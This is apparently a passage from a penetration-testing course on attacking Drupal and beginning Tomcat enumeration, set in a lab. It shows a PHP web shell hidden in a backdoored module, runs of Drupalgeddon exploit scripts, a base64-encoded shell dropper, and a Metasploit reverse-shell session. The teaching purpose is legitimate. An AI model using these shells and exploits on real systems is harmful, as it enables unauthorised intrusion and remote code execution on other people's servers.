<p>Drupal allows users with appropriate permissions to upload a new module. A backdoored module can be created by adding a shell to an existing module. Modules can be found on the drupal.org website. Let&#39;s pick a module such as <a href="https://www.drupal.org/project/captcha">CAPTCHA</a>. Scroll down and copy the link for the tar.gz <a href="https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz">archive</a>.</p>
<p>Download the archive and extract its contents.</p>
<p>Attacking Drupal</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ wget --no-check-certificate  https:<span class="hljs-comment">//ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz</span>
root@htb[/htb]$ tar xvf captcha-<span class="hljs-number">8</span><span class="hljs-selector-class">.x-1</span>.<span class="hljs-number">2</span><span class="hljs-selector-class">.tar</span><span class="hljs-selector-class">.gz</span>
</code></pre>
<p>Create a PHP web shell with the contents:</p>
<p>Code: php</p>
<pre><code class="lang-php"><span class="php"><span class="hljs-meta">&lt;?php</span>
system($_GET[fe8edbabc5c5c9b7b764504cd22b17af]);
<span class="hljs-meta">?&gt;</span></span>
</code></pre>
<p>Next, we need to create a .htaccess file to give ourselves access to the folder. This is necessary as Drupal denies direct access to the /modules folder.</p>
<p>Code: html</p>
<pre><code class="lang-html"><span class="hljs-section">&lt;IfModule mod_rewrite.c&gt;</span>
<span class="hljs-attribute"><span class="hljs-nomarkup">RewriteEngine</span></span> <span class="hljs-literal">On</span>
<span class="hljs-attribute">RewriteBase</span> /
<span class="hljs-section">&lt;/IfModule&gt;</span>
</code></pre>
<p>The configuration above will apply rules for the / folder when we request a file in /modules. Copy both of these files to the captcha folder and create an archive.</p>
<p>Attacking Drupal</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ mv shell<span class="hljs-selector-class">.php</span> <span class="hljs-selector-class">.htaccess</span> captcha
root@htb[/htb]$ tar cvf captcha<span class="hljs-selector-class">.tar</span><span class="hljs-selector-class">.gz</span> captcha/

captcha/
captcha/<span class="hljs-selector-class">.travis</span><span class="hljs-selector-class">.yml</span>
captcha/README<span class="hljs-selector-class">.md</span>
captcha/captcha<span class="hljs-selector-class">.api</span><span class="hljs-selector-class">.php</span>
captcha/captcha<span class="hljs-selector-class">.inc</span>
captcha/captcha<span class="hljs-selector-class">.info</span><span class="hljs-selector-class">.yml</span>
captcha/captcha<span class="hljs-selector-class">.install</span>

&lt;SNIP&gt;
</code></pre>
<p>Assuming we have administrative access to the website, click on <code>Manage</code> and then <code>Extend</code> on the sidebar. Next, click on the <code>+ Install new module</code> button, and we will be taken to the install page, such as <code>http://drupal.inlanefreight.local/admin/modules/install</code> Browse to the backdoored Captcha archive and click <code>Install</code>.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/113/module\_installed.png" alt=""></p>
<p>Once the installation succeeds, browse to <code>/modules/captcha/shell.php</code> to execute commands.</p>
<p>Attacking Drupal</p>
<pre><code class="lang-shell-session"><span class="hljs-title">root</span>@htb[/htb]$ curl -s drupal.inlanefreight.local/modules/captcha/shell.php?fe8edbabc5c5c9b7b764504cd22b17af=id

<span class="hljs-title">uid</span>=<span class="hljs-number">33</span>(www-<span class="hljs-class"><span class="hljs-keyword">data</span>) gid=33(<span class="hljs-title">www</span>-<span class="hljs-title">data</span>) groups=33(<span class="hljs-title">www</span>-<span class="hljs-title">data</span>)</span>
</code></pre>
<hr>
<h3 id="leveraging-known-vulnerabilities">Leveraging Known Vulnerabilities</h3>
<p>Over the years, Drupal core has suffered from a few serious remote code execution vulnerabilities, each dubbed <code>Drupalgeddon</code>. At the time of writing, there are 3 Drupalgeddon vulnerabilities in existence.</p>
<ul>
<li><a href="https://www.drupal.org/SA-CORE-2014-005">CVE-2014-3704</a>, known as Drupalgeddon, affects versions 7.0 up to 7.31 and was fixed in version 7.32. This was a pre-authenticated SQL injection flaw that could be used to upload a malicious form or create a new admin user.</li>
<li><a href="https://www.drupal.org/sa-core-2018-002">CVE-2018-7600</a>, also known as Drupalgeddon2, is a remote code execution vulnerability, which affects versions of Drupal prior to 7.58 and 8.5.1. The vulnerability occurs due to insufficient input sanitization during user registration, allowing system-level commands to be maliciously injected.</li>
<li><a href="https://cvedetails.com/cve/CVE-2018-7602/">CVE-2018-7602</a>, also known as Drupalgeddon3, is a remote code execution vulnerability that affects multiple versions of Drupal 7.x and 8.x. This flaw exploits improper validation in the Form API.</li>
</ul>
<p>Let&#39;s walk through exploiting each of these.</p>
<hr>
<h3 id="drupalgeddon">Drupalgeddon</h3>
<p>As stated previously, this flaw can be exploited by leveraging a pre-authentication SQL injection which can be used to upload malicious code or add an admin user. Let&#39;s try adding a new admin user with this <a href="https://www.exploit-db.com/exploits/34992">PoC</a> script. Once an admin user is added, we could log in and enable the <code>PHP Filter</code> module to achieve remote code execution.</p>
<p>Running the script with the <code>-h</code> flag shows us the help menu.</p>
<p>Attacking Drupal</p>
<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb[/htb]$</span> python2.7 drupalgeddon.py 

  ______                          __     _______  _______ _____    
 |<span class="hljs-string">   _  \ .----.--.--.-----.---.-</span>|<span class="hljs-string">  </span>|<span class="hljs-string">   </span>|<span class="hljs-string">   _   </span>||<span class="hljs-string">   _   </span>|<span class="hljs-string"> _   </span>|<span class="hljs-string">   
 </span>|<span class="hljs-string">.  </span>|<span class="hljs-string">   \</span>|<span class="hljs-string">   _</span>|<span class="hljs-string">  </span>|<span class="hljs-string">  </span>|<span class="hljs-string">  _  </span>|<span class="hljs-string">  _  </span>|<span class="hljs-string">  </span>|<span class="hljs-string">   </span>|<span class="hljs-string">___</span>|<span class="hljs-string">   _</span>|<span class="hljs-string">___</span>|<span class="hljs-string">   </span>|<span class="hljs-string">.</span>|<span class="hljs-string">   </span>|<span class="hljs-string">   
 </span>|<span class="hljs-string">.  </span>|<span class="hljs-string">    </span>|<span class="hljs-string">__</span>|<span class="hljs-string"> </span>|<span class="hljs-string">_____</span>|<span class="hljs-string">   __</span>|<span class="hljs-string">___._</span>|<span class="hljs-string">__</span>|<span class="hljs-string">      /   </span>|<span class="hljs-string">___(__   `-</span>|<span class="hljs-string">.  </span>|<span class="hljs-string">   
 </span>|<span class="hljs-string">:  1    /          </span>|<span class="hljs-string">__</span>|<span class="hljs-string">                 </span>|<span class="hljs-string">   </span>|<span class="hljs-string">  </span>|<span class="hljs-string">:  1   </span>|<span class="hljs-string"> </span>|<span class="hljs-string">:  </span>|<span class="hljs-string">   
 </span>|<span class="hljs-string">::.. . /                                </span>|<span class="hljs-string">   </span>|<span class="hljs-string">  </span>|<span class="hljs-string">::.. . </span>|<span class="hljs-string"> </span>|<span class="hljs-string">::.</span>|<span class="hljs-string">   
 `------'                                 `---'  `-------' `---'   
  _______       __     ___       __            __   __             
 </span>|<span class="hljs-string">   _   .-----</span>|<span class="hljs-string">  </span>|<span class="hljs-string">   </span>|<span class="hljs-string">   .-----</span>|<span class="hljs-string">__.-----.----</span>|<span class="hljs-string">  </span>|<span class="hljs-string">_</span>|<span class="hljs-string">__.-----.-----.
 </span>|<span class="hljs-string">   1___</span>|<span class="hljs-string">  _  </span>|<span class="hljs-string">  </span>|<span class="hljs-string">   </span>|<span class="hljs-string">.  </span>|<span class="hljs-string">     </span>|<span class="hljs-string">  </span>|<span class="hljs-string">  -__</span>|<span class="hljs-string">  __</span>|<span class="hljs-string">   _</span>|<span class="hljs-string">  </span>|<span class="hljs-string">  _  </span>|<span class="hljs-string">     </span>|
 |<span class="hljs-string">____   </span>|<span class="hljs-string">__   </span>|<span class="hljs-string">__</span>|<span class="hljs-string">   </span>|<span class="hljs-string">.  </span>|<span class="hljs-string">__</span>|<span class="hljs-string">__</span>|<span class="hljs-string">  </span>|<span class="hljs-string">_____</span>|<span class="hljs-string">____</span>|<span class="hljs-string">____</span>|<span class="hljs-string">__</span>|<span class="hljs-string">_____</span>|<span class="hljs-string">__</span>|<span class="hljs-string">__</span>|
 |<span class="hljs-string">:  1   </span>|<span class="hljs-string">  </span>|<span class="hljs-string">__</span>|<span class="hljs-string">      </span>|<span class="hljs-string">:  </span>|<span class="hljs-string">    </span>|<span class="hljs-string">___</span>|<span class="hljs-string">                               
 </span>|<span class="hljs-string">::.. . </span>|<span class="hljs-string">            </span>|<span class="hljs-string">::.</span>|<span class="hljs-string">                                        
 `-------'            `---'                                        

                                 Drup4l =&gt; 7.0 &lt;= 7.31 Sql-1nj3ct10n
                                              Admin 4cc0unt cr3at0r

              Discovered by:

              Stefan  Horst
                         (CVE-2014-3704)

                           Written by:

                         Claudio Viviani

                      http://www.homelab.it

                         info@homelab.it
                     homelabit@protonmail.ch

                 https://www.facebook.com/homelabit
                   https://twitter.com/homelabit
                 https://plus.google.com/+HomelabIt1/
       https://www.youtube.com/channel/UCqqmSdMqf_exicCe_DjlBww



Usage: drupalgeddon.py -t http[s]://TARGET_URL -u USER -p PASS


Options:
  -h, --help            show this help message and exit
  -t TARGET, --target=TARGET
                        Insert URL: http[s]://www.victim.com
  -u USERNAME, --username=USERNAME
                        Insert username
  -p PWD, --pwd=PWD     Insert password</span>
</code></pre>
<p>Here we see that we need to supply the target URL and a username and password for our new admin account. Let&#39;s run the script and see if we get a new admin user.</p>
<p>Attacking Drupal</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ python2.<span class="hljs-number">7</span> drupalgeddon.py -t http://drupal-qa.inlanefreight.local -u hacker -p pwnd

<span class="hljs-tag">&lt;SNIP&gt;</span>

[!] VULNERABLE!

[!] Administrator <span class="hljs-keyword">user</span> <span class="hljs-title">created</span>!

[*] Login: hacker
[*] Pass: pwnd
[*] Url: http://drupal-qa.inlanefreight.local/?q=<span class="hljs-keyword">node</span><span class="hljs-title">&amp;destination</span>=<span class="hljs-keyword">node</span><span class="hljs-title"></span>
</code></pre>
<p>Now let&#39;s see if we can log in as an admin. We can! Now from here, we could obtain a shell through the various means discussed previously in this section.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/113/drupalgeddon.png" alt=""></p>
<p>We could also use the <a href="https://www.rapid7.com/db/modules/exploit/multi/http/drupal\_drupageddon/">exploit/multi/http/drupal_drupageddon</a> Metasploit module to exploit this.</p>
<hr>
<h3 id="drupalgeddon2">Drupalgeddon2</h3>
<p>We can use <a href="https://www.exploit-db.com/exploits/44448">this</a> PoC to confirm this vulnerability.</p>
<p>Attacking Drupal</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ python3 drupalgeddon2.py 

################################################################
# Proof-Of-Concept for CVE<span class="hljs-number">-2018</span><span class="hljs-number">-7600</span>
# by Vitalii Rudnykh
# Thanks by AlbinoDrought, RicterZ, FindYanot, CostelSalanders
# https:<span class="hljs-comment">//github.com/a2u/CVE-2018-7600</span>
################################################################
Provided only for educational or information purposes

Enter target url (example: https:<span class="hljs-comment">//domain.ltd/): http://drupal-dev.inlanefreight.local/</span>

Check: http:<span class="hljs-comment">//drupal-dev.inlanefreight.local/hello.txt</span>
</code></pre>
<p>We can check quickly with <code>cURL</code> and see that the <code>hello.txt</code> file was indeed uploaded.</p>
<p>Attacking Drupal</p>
<pre><code class="lang-shell-session"><span class="hljs-selector-tag">root</span>@<span class="hljs-keyword">htb</span>[/<span class="hljs-keyword">htb</span>]$ curl -s http://drupal-dev.inlanefreight.local/hello.txt

;<span class="hljs-selector-tag">-</span>)
</code></pre>
<p>Now let&#39;s modify the script to gain remote code execution by uploading a malicious PHP file.</p>
<p>Code: php</p>
<pre><code class="lang-php"><span class="php"><span class="hljs-meta">&lt;?php</span> system($_GET[fe8edbabc5c5c9b7b764504cd22b17af]);<span class="hljs-meta">?&gt;</span></span>
</code></pre>
<p>Attacking Drupal</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ echo <span class="hljs-string">'&lt;?php system($_GET[fe8edbabc5c5c9b7b764504cd22b17af]);?&gt;'</span> | base<span class="hljs-number">64</span>

PD<span class="hljs-number">9</span>waHAgc<span class="hljs-number">3</span>lzdGVtKCRfR<span class="hljs-number">0</span>VUW<span class="hljs-number">2</span>ZlOGVkYmFiYzVj<span class="hljs-symbol">NWM5</span>Yjdi<span class="hljs-symbol">NzY0</span><span class="hljs-symbol">NTA0</span>Y<span class="hljs-number">2</span>QyMmIx<span class="hljs-symbol">N2</span>FmXSk<span class="hljs-number">7</span>Pz<span class="hljs-number">4</span>K
</code></pre>
<p>Next, let&#39;s replace the <code>echo</code> command in the exploit script with a command to write out our malicious PHP script.</p>
<p>Attacking Drupal</p>
<pre><code class="lang-shell-session"> <span class="hljs-built_in">echo</span> <span class="hljs-string">"PD9waHAgc3lzdGVtKCRfR0VUW2ZlOGVkYmFiYzVjNWM5YjdiNzY0NTA0Y2QyMmIxN2FmXSk7Pz4K"</span> | base64 <span class="hljs-_">-d</span> | tee mrb3n.php
</code></pre>
<p>Next, run the modified exploit script to upload our malicious PHP file.</p>
<p>Attacking Drupal</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ python3 drupalgeddon2.py 

################################################################
# Proof-Of-Concept for CVE<span class="hljs-number">-2018</span><span class="hljs-number">-7600</span>
# by Vitalii Rudnykh
# Thanks by AlbinoDrought, RicterZ, FindYanot, CostelSalanders
# https:<span class="hljs-comment">//github.com/a2u/CVE-2018-7600</span>
################################################################
Provided only for educational or information purposes

Enter target url (example: https:<span class="hljs-comment">//domain.ltd/): http://drupal-dev.inlanefreight.local/</span>

Check: http:<span class="hljs-comment">//drupal-dev.inlanefreight.local/mrb3n.php</span>
</code></pre>
<p>Finally, we can confirm remote code execution using <code>cURL</code>.</p>
<p>Attacking Drupal</p>
<pre><code class="lang-shell-session"><span class="hljs-symbol">root@</span>htb[/htb]$ curl http:<span class="hljs-comment">//drupal-dev.inlanefreight.local/mrb3n.php?fe8edbabc5c5c9b7b764504cd22b17af=id</span>

uid=<span class="hljs-number">33</span>(www-<span class="hljs-keyword">data</span>) gid=<span class="hljs-number">33</span>(www-<span class="hljs-keyword">data</span>) groups=<span class="hljs-number">33</span>(www-<span class="hljs-keyword">data</span>)
</code></pre>
<hr>
<h3 id="drupalgeddon3">Drupalgeddon3</h3>
<p><a href="https://github.com/rithchard/Drupalgeddon3">Drupalgeddon3</a> is an authenticated remote code execution vulnerability that affects <a href="https://www.drupal.org/sa-core-2018-004">multiple versions</a> of Drupal core. It requires a user to have the ability to delete a node. We can exploit this using Metasploit, but we must first log in and obtain a valid session cookie.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/113/burp.png" alt="image"></p>
<p>Once we have the session cookie, we can set up the exploit module as follows.</p>
<p>Attacking Drupal</p>
<pre><code class="lang-shell-session">msf6 exploit(multi/http/drupal_drupageddon3) &gt; <span class="hljs-keyword">set</span> rhosts <span class="hljs-comment">10.129.42.195</span>
msf6 <span class="hljs-comment">exploit(multi</span>/http/<span class="hljs-comment">drupal_drupageddon3) &gt; set VHOST drupal-acc.inlanefreight.local</span>   
msf6 <span class="hljs-comment">exploit(multi</span>/http/<span class="hljs-comment">drupal_drupageddon3) &gt; set drupal_session SESS45ecfcb93a827c3e578eae161f280548=jaAPbanr2KhLkLJwo69t0UOkn2505tXCaEdu33ULV2Y</span>
msf6 <span class="hljs-comment">exploit(multi</span>/http/<span class="hljs-comment">drupal_drupageddon3) &gt; set DRUPAL_NODE 1</span>
msf6 <span class="hljs-comment">exploit(multi</span>/http/<span class="hljs-comment">drupal_drupageddon3) &gt; set LHOST 10.10.14.15</span>
msf6 <span class="hljs-comment">exploit(multi</span>/http/<span class="hljs-comment">drupal_drupageddon3) &gt; show options</span> 

Module <span class="hljs-comment">options (exploit</span>/multi/<span class="hljs-comment">http</span>/drupal_drupageddon3):

   Name            Current Setting                                                                   Required  Description
   ----            ---------------                                                                   --------  -----------
   DRUPAL_NODE     <span class="hljs-number">1</span>                                                                                 <span class="hljs-keyword">yes</span>       Exist Node Number (Page, Article, Forum topic, <span class="hljs-keyword">or</span> a Post)
   DRUPAL_SESSION  SESS45ecfcb93a827c3e578eae161f280548=jaAPbanr2KhLkLJwo69t0UOkn2505tXCaEdu33ULV2Y  <span class="hljs-keyword">yes</span>       Authenticated Cookie Session
   Proxies                                                                                           <span class="hljs-keyword">no</span>        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS          <span class="hljs-number">10.129</span><span class="hljs-number">.42</span><span class="hljs-number">.195</span>                                                                     <span class="hljs-keyword">yes</span>       The target host(s), range CIDR identifier, <span class="hljs-keyword">or</span> hosts <span class="hljs-keyword">file</span> with syntax <span class="hljs-comment">'file:&lt;path&gt;'</span>
   RPORT           <span class="hljs-number">80</span>                                                                                <span class="hljs-keyword">yes</span>       The target port (TCP)
   SSL             false                                                                             <span class="hljs-keyword">no</span>        Negotiate SSL/<span class="hljs-comment">TLS for outgoing connections</span>
   TARGETURI       /                                                                                 <span class="hljs-keyword">yes</span>       The target URI of the Drupal installation
   VHOST           drupal-acc.inlanefreight.local                                                    <span class="hljs-keyword">no</span>        HTTP server virtual host


Payload <span class="hljs-keyword">options</span> (php/<span class="hljs-comment">meterpreter</span>/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  <span class="hljs-number">10.10</span><span class="hljs-number">.14</span><span class="hljs-number">.15</span>      <span class="hljs-keyword">yes</span>       The listen address (an interface may be specified)
   LPORT  <span class="hljs-number">4444</span>             <span class="hljs-keyword">yes</span>       The listen port


Exploit target:

   Id  Name
   --  ----
   <span class="hljs-number">0</span>   User register form with exec
</code></pre>
<p>If successful, we will obtain a reverse shell on the target host.</p>
<p>Attacking Drupal</p>
<pre><code class="lang-shell-session"><span class="hljs-selector-tag">msf6</span> <span class="hljs-selector-tag">exploit</span>(multi/http/drupal_drupageddon3) &gt; <span class="hljs-selector-tag">exploit</span>

<span class="hljs-selector-attr">[*]</span> <span class="hljs-selector-tag">Started</span> <span class="hljs-selector-tag">reverse</span> <span class="hljs-selector-tag">TCP</span> <span class="hljs-selector-tag">handler</span> <span class="hljs-selector-tag">on</span> <span class="hljs-selector-tag">10</span><span class="hljs-selector-class">.10</span><span class="hljs-selector-class">.14</span><span class="hljs-selector-class">.15</span><span class="hljs-selector-pseudo">:4444</span> 
<span class="hljs-selector-attr">[*]</span> <span class="hljs-selector-tag">Token</span> <span class="hljs-selector-tag">Form</span> <span class="hljs-selector-tag">-</span>&gt; <span class="hljs-selector-tag">GH5mC4x2UeKKb2Dp6Mhk4A9082u9BU_sWtEudedxLRM</span>
<span class="hljs-selector-attr">[*]</span> <span class="hljs-selector-tag">Token</span> <span class="hljs-selector-tag">Form_build_id</span> <span class="hljs-selector-tag">-</span>&gt; <span class="hljs-selector-tag">form-vjqTCj2TvVdfEiPtfbOSEF8jnyB6eEpAPOSHUR2Ebo8</span>
<span class="hljs-selector-attr">[*]</span> <span class="hljs-selector-tag">Sending</span> <span class="hljs-selector-tag">stage</span> (<span class="hljs-number">39264</span> bytes) <span class="hljs-selector-tag">to</span> <span class="hljs-selector-tag">10</span><span class="hljs-selector-class">.129</span><span class="hljs-selector-class">.42</span><span class="hljs-selector-class">.195</span>
<span class="hljs-selector-attr">[*]</span> <span class="hljs-selector-tag">Meterpreter</span> <span class="hljs-selector-tag">session</span> <span class="hljs-selector-tag">1</span> <span class="hljs-selector-tag">opened</span> (<span class="hljs-number">10.10</span>.<span class="hljs-number">14.15</span>:<span class="hljs-number">4444</span> -&gt; <span class="hljs-number">10.129</span>.<span class="hljs-number">42.195</span>:<span class="hljs-number">44612</span>) <span class="hljs-selector-tag">at</span> <span class="hljs-selector-tag">2021-08-24</span> <span class="hljs-selector-tag">12</span><span class="hljs-selector-pseudo">:38</span><span class="hljs-selector-pseudo">:07</span> <span class="hljs-selector-tag">-0400</span>

<span class="hljs-selector-tag">meterpreter</span> &gt; <span class="hljs-selector-tag">getuid</span>

<span class="hljs-selector-tag">Server</span> <span class="hljs-selector-tag">username</span>: <span class="hljs-selector-tag">www-data</span> (<span class="hljs-number">33</span>)


<span class="hljs-selector-tag">meterpreter</span> &gt; <span class="hljs-selector-tag">sysinfo</span>

<span class="hljs-selector-tag">Computer</span>    : <span class="hljs-selector-tag">app01</span>
<span class="hljs-selector-tag">OS</span>          : <span class="hljs-selector-tag">Linux</span> <span class="hljs-selector-tag">app01</span> <span class="hljs-selector-tag">5</span><span class="hljs-selector-class">.4</span><span class="hljs-selector-class">.0-81-generic</span> <span class="hljs-selector-id">#91-Ubuntu</span> <span class="hljs-selector-tag">SMP</span> <span class="hljs-selector-tag">Thu</span> <span class="hljs-selector-tag">Jul</span> <span class="hljs-selector-tag">15</span> <span class="hljs-selector-tag">19</span><span class="hljs-selector-pseudo">:09</span><span class="hljs-selector-pseudo">:17</span> <span class="hljs-selector-tag">UTC</span> <span class="hljs-selector-tag">2021</span> <span class="hljs-selector-tag">x86_64</span>
<span class="hljs-selector-tag">Meterpreter</span> : <span class="hljs-selector-tag">php</span>/<span class="hljs-selector-tag">linux</span>
</code></pre>
<hr>
<h3 id="onwards">Onwards</h3>
<p>We have enumerated and attacked some of the most prevalent CMS&#39;: WordPress, Drupal, and Joomla. Next, let&#39;s move on to Tomcat, which has been putting a smile on the face of pentesters for years.</p>
<h2 id="tomcat-discovery-enumeration">Tomcat - Discovery &amp; Enumeration</h2>
<hr>
<p><a href="https://tomcat.apache.org/">Apache Tomcat</a> is an open-source web server that hosts applications written in Java. Tomcat was initially designed to run Java Servlets and Java Server Pages (JSP) scripts. However, its popularity increased in Java-based frameworks and is now widely used by frameworks such as Spring and tools such as Gradle. According to data gathered by <a href="https://trends.builtwith.com/Web-Server/Apache-Tomcat-Coyote">BuiltWith</a> there are over 220,000 live Tomcat websites at this time. Here are a few more interesting statistics:</p>
<ul>
<li>BuiltWith has gathered data that shows that over 904,000 websites have at one point been using Tomcat</li>
<li>1.22% of the top 1 million websites are using Tomcat, while 3.8% of the top 100k websites are</li>
<li>Tomcat holds position <a href="https://webtechsurvey.com/technology/apache-tomcat"># 13</a> for web servers by market share</li>
<li>Some organizations that use Tomcat include Alibaba, the United States Patent and Trademark Office (USPTO), The American Red Cross, and the LA Times</li>
</ul>
<p>Tomcat is often less apt to be exposed to the internet (though). We see it from time to time on external pentests and can make for an excellent foothold into the internal network. It is far more common to see Tomcat (and multiple instances, for that matter) during internal pentests. It&#39;ll usually occupy the first spot under &quot;High Value Targets&quot; within an EyeWitness report, and more often than not, at least one instance internal is configured with weak or default credentials. More on that later.</p>
<hr>
<h3 id="discovery-footprinting">Discovery/Footprinting</h3>
<p>During our external penetration test, we run EyeWitness and see one host listed under &quot;High Value Targets.&quot; The tool believes the host is running Tomcat, but we must confirm to plan our attacks. If we are dealing with Tomcat on the external network, this could be an easy foothold into the internal network environment.</p>
<p>Tomcat servers can be identified by the Server header in the HTTP response. If the server is operating behind a reverse proxy, requesting an invalid page should reveal the server and version. Here we can see that Tomcat version <code>9.0.30</code> is in use.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/113/tomcat\_invalid.png" alt=""></p>
<p>Custom error pages may be in use that do not leak this version information. In this case, another method of detecting a Tomcat server and version is through the <code>/docs</code> page.</p>
<p>Tomcat - Discovery &amp; Enumeration</p>
<pre><code class="lang-shell-session"><span class="xml">root@htb[/htb]$ curl -s http://app-dev.inlanefreight.local:8080/docs/ | grep Tomcat 

<span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">"en"</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">META</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">"Content-Type"</span> <span class="hljs-attr">content</span>=<span class="hljs-string">"text/html; charset=UTF-8"</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"./images/docs-stylesheet.css"</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">"stylesheet"</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"text/css"</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Apache Tomcat 9 (9.0.30) - Documentation Index<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"author"</span> 

&lt;<span class="hljs-attr">SNIP</span>&gt;</span></span>
</code></pre>
<p>This is the default documentation page, which may not be removed by administrators. Here is the general folder structure of a Tomcat installation.</p>
<p>Tomcat - Discovery &amp; Enumeration</p>
<pre><code class="lang-shell-session">├── bin
├── conf
│   ├── catalina.policy
│   ├── catalina.properties
│   ├── context.<span class="hljs-keyword">xml</span>
<span class="hljs-title">│   ├── tomcat-users</span>.<span class="hljs-keyword">xml</span>
<span class="hljs-title">│   ├── tomcat-users</span>.xsd
│   └── web.<span class="hljs-keyword">xml</span>
<span class="hljs-title">├── lib</span>
├── logs
├── temp
├── webapps
│   ├── manager
│   │   ├── images
│   │   ├── <span class="hljs-keyword">META</span><span class="hljs-literal">-INF</span>
│   │   └── WEB<span class="hljs-literal">-INF</span>
|   |       └── web.<span class="hljs-keyword">xml</span>
<span class="hljs-title">│   └── ROOT</span>
│       └── WEB<span class="hljs-literal">-INF</span>
└── work
    └── Catalina
        └── localhost
</code></pre>
<p>The <code>bin</code> folder stores scripts and binaries needed to start and run a Tomcat server. The <code>conf</code> folder stores various configuration files used by Tomcat. The <code>tomcat-users.xml</code> file stores user credentials and their assigned roles. The <code>lib</code> folder holds the various JAR files needed for the correct functioning of Tomcat. The <code>logs</code> and <code>temp</code> folders store temporary log files. The <code>webapps</code> folder is the default webroot of Tomcat and hosts all the applications. The <code>work</code> folder acts as a cache and is used to store data during runtime.</p>
<p>Each folder inside <code>webapps</code> is expected to have the following structure.</p>
<p>Tomcat - Discovery &amp; Enumeration</p>
<pre><code class="lang-shell-session">webapps/customapp
├── images
├── index.jsp
├── META-INF
│   └── context.xml
├── status.xsd
└── WEB-INF
    ├── jsp
    |   └── admin.jsp
    └── web.xml
    └── <span class="hljs-class"><span class="hljs-keyword">lib</span></span>
    |    └── jdbc_drivers.jar
    └── classes
        └── AdminServlet.<span class="hljs-keyword">class</span>
</code></pre>
<p>The most important file among these is <code>WEB-INF/web.xml</code>, which is known as the deployment descriptor. This file stores information about the routes used by the application and the classes handling these routes. All compiled classes used by the application should be stored in the <code>WEB-INF/classes</code> folder. These classes might contain important business logic as well as sensitive information. Any vulnerability in these files can lead to total compromise of the website. The <code>lib</code> folder stores the libraries needed by that particular application. The <code>jsp</code> folder stores <a href="https://en.wikipedia.org/wiki/Jakarta\_Server\_Pages">Jakarta Server Pages (JSP)</a>, formerly known as <code>JavaServer Pages</code>, which can be compared to PHP files on an Apache server.</p>
<p>Here’s an example web.xml file.</p>
<p>Code: xml</p>
<pre><code class="lang-xml"><span class="php"><span class="hljs-meta">&lt;?</span>xml version=<span class="hljs-string">"1.0"</span> encoding=<span class="hljs-string">"ISO-8859-1"</span><span class="hljs-meta">?&gt;</span></span>

<span class="hljs-meta">&lt;!DOCTYPE web-app PUBLIC "-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN" "http://java.sun.com/dtd/web-app_2_3.dtd"&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">web-app</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">servlet</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>AdminServlet<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">servlet-class</span>&gt;</span>com.inlanefreight.api.AdminServlet<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-class</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">servlet</span>&gt;</span>

  <span class="hljs-tag">&lt;<span class="hljs-name">servlet-mapping</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>AdminServlet<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">url-pattern</span>&gt;</span>/admin<span class="hljs-tag">&lt;/<span class="hljs-name">url-pattern</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">servlet-mapping</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">web-app</span>&gt;</span>
</code></pre>
<p>The <code>web.xml</code> configuration above defines a new servlet named <code>AdminServlet</code> that is mapped to the class <code>com.inlanefreight.api.AdminServlet</code>. Java uses the dot notation to create package names, meaning the path on disk for the class defined above would be:</p>
<ul>
<li><code>classes/com/inlanefreight/api/AdminServlet.class</code></li>
</ul>
<p>Next, a new servlet mapping is created to map requests to <code>/admin</code> with <code>AdminServlet</code>. This configuration will send any request received for <code>/admin</code> to the <code>AdminServlet.class</code> class for processing. The <code>web.xml</code> descriptor holds a lot of sensitive information and is an important file to check when leveraging a Local File Inclusion (LFI) vulnerability.</p>
<p>The <code>tomcat-users.xml</code> file is used to allow or disallow access to the <code>/manager</code> and <code>host-manager</code> admin pages.</p>
<p>Code: xml</p>
<pre><code class="lang-xml"><span class="php"><span class="hljs-meta">&lt;?</span>xml version=<span class="hljs-string">"1.0"</span> encoding=<span class="hljs-string">"UTF-8"</span><span class="hljs-meta">?&gt;</span></span>

<span class="hljs-tag">&lt;<span class="hljs-name">SNIP</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">tomcat-users</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">"http://tomcat.apache.org/xml"</span>
              <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">"http://www.w3.org/2001/XMLSchema-instance"</span>
